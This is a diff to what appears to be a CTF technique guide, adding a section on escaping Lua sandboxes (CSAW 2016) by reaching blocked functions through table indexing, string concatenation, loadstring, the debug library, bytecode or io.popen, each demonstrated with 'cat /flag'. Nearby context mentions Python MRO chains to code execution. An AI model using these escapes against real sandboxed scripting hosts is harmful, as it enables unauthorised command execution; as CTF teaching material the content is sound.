@@ -21,6 +21,7 @@
   - [Red Flags in Challenges](#red-flags-in-challenges)
   - [Quick Test Script](#quick-test-script)
 - [Custom Assembly Language Sandbox Escape (EHAX 2026)](#custom-assembly-language-sandbox-escape-ehax-2026)
+- [Lua Sandbox Escape via Function Name Injection (CSAW CTF 2016)](#lua-sandbox-escape-via-function-name-injection-csaw-ctf-2016)
 - [References](#references)
 
 ---
@@ -410,6 +411,41 @@ STDOUT E                         # print flag
 3. **Test string handling:** Try hex-encoded strings to bypass keyword filters
 4. **Chain Python MRO:** Any Python string object → `__class__.__base__.__subclasses__()` → RCE
 5. **Error messages leak info:** Intentional errors reveal Python internals and available classes
+
+---
+
+## Lua Sandbox Escape via Function Name Injection (CSAW CTF 2016)
+
+Lua sandboxes that filter `load()` and `os.execute()` by name can be bypassed if function references exist in other accessible tables or through string concatenation of function names.
+
+```lua
+-- Common Lua sandbox restrictions:
+-- os.execute blocked, load blocked, require blocked
+
+-- Bypass 1: If string.find is available, use it to test for allowed functions
+-- then access via table indexing
+local f = os["execute"]  -- table index bypass if only os.execute() call is blocked
+f("cat /flag")
+
+-- Bypass 2: Use loadstring (alias for load in Lua 5.1)
+loadstring("os.execute('cat /flag')")()
+
+-- Bypass 3: Via debug library (if available)
+debug.getregistry()  -- access internal Lua registry
+
+-- Bypass 4: Bytecode execution (compile outside, load bytecode)
+-- Compile payload: luac -o payload.luac payload.lua
+-- Load bytecode in sandbox (may bypass source-level filters)
+
+-- Bypass 5: Concatenation to build function names
+local cmd = "exe" .. "cute"
+os[cmd]("cat /flag")
+
+-- Bypass 6: Via io library
+io.popen("cat /flag"):read("*a")
+```
+
+**Key insight:** Lua sandboxes typically filter specific function *calls* but not *table lookups*. Access blocked functions through table indexing (`os["execute"]`), string concatenation for function names, or alternate I/O libraries (`io.popen`). Also check if `loadstring` (Lua 5.1 alias for `load`) is unblocked.
 
 ---
 
